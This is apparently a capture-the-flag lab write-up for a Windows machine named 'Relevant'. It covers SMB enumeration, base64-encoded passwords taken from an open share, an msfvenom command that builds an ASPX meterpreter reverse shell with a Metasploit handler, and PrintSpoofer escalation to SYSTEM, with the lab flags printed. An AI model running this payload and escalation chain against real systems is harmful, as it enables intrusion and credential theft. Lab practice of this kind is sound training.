# Relevant

---

IP = `10.10.103.27`

## Recon


```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

```


```
┌──(root㉿core)-[/work/ctf/thm/relevant]
└─# smbclient -NL 10.10.103.27

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.89.151 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

```
┌──(root㉿core)-[/work/ctf/thm/relevant]
└─# smbclient -N //10.10.103.27/nt4wrksv
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 21:46:04 2020
  ..                                  D        0  Sat Jul 25 21:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 15:15:33 2020

                7735807 blocks of size 4096. 4951059 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \>
```

```
┌──(root㉿core)-[/work/ctf/thm/relevant]
└─# cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

`Bob : !P@$$W0rD!123`
`Bill : Juw4nnaM4n420696969!$$$`

http://10.10.103.27:49663/nt4wrksv/passwords.txt

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=4545 -f aspx -o met4545.aspx`

```
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST tun0
set LPORT 4545
run
```

```
meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool

```

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege

meterpreter >
```

## Privilege Escaltion

Option 1:

PrintSpoofer
https://github.com/itm4n/PrintSpoofer/

Option 2:

Juicy-Potato
https://github.com/ohpe/juicy-potato


Let's Try PrintSpoofer

```
meterpreter > cd C:/Windows/Tasks
meterpreter > pwd
C:\Windows\Tasks
meterpreter > upload PrintSpoofer64.exe
[*] Uploading  : /work/ctf/thm/relevant/PrintSpoofer64.exe -> PrintSpoofer64.exe
[*] Uploaded 26.50 KiB of 26.50 KiB (100.0%): /work/ctf/thm/relevant/PrintSpoofer64.exe -> PrintSpoofer64.exe
[*] Completed  : /work/ctf/thm/relevant/PrintSpoofer64.exe -> PrintSpoofer64.exe
meterpreter > shell
Process 2336 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\Tasks>whoami
whoami
iis apppool\defaultapppool

C:\Windows\Tasks>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\Windows\Tasks

09/29/2024  05:46 AM    <DIR>          .
09/29/2024  05:46 AM    <DIR>          ..
09/29/2024  05:46 AM            27,136 PrintSpoofer64.exe
               1 File(s)         27,136 bytes
               2 Dir(s)  21,040,087,040 bytes free

C:\Windows\Tasks>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

```
C:\Windows\system32>cd ../../Users/Bob/Desktop
C:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
C:\Users\Bob\Desktop>
```

> user.txt

`THM{fdk4ka34vk346ksxfr21tg789ktf45}`


```
C:\Users\Bob\Desktop>cd ../../Administrator/Desktop
cd ../../Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,040,017,408 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
C:\Users\Administrator\Desktop>

```

> root.txt

`THM{1fk5kf469devly1gl320zafgl345pv}`